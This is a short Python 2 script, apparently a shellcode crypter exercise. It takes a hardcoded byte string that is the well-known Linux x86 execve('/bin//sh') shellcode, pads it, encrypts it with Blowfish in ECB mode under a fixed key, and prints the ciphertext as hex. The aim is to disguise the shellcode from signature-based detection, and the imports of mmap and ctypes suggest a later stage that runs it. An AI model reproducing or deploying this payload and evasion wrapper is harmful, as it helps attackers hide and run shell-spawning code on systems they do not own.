from Crypto.Cipher import Blowfish
import mmap
import ctypes

plaintext = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

def padding(data):
	remainder = len(data) % 8
	if remainder == 0:
		print "No need for padding"
		return data
	else:
		print "Adding spaces !"
		padding = 8 - remainder
		data = data + " " * padding
		return data
	

def encrypt(data):
	crypt_obj = Blowfish.new('12ejkwirpoernsor', Blowfish.MODE_ECB)
	ciphertext = crypt_obj.encrypt(data)
	return ciphertext


if __name__ == "__main__":
	plaintext = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	plaintext_padding = padding(plaintext)
	ciphertext = encrypt(plaintext_padding)
	crypt_obj = Blowfish.new('12ejkwirpoernsor', Blowfish.MODE_ECB)
	print "Ciphertext is " + ciphertext.encode("hex")

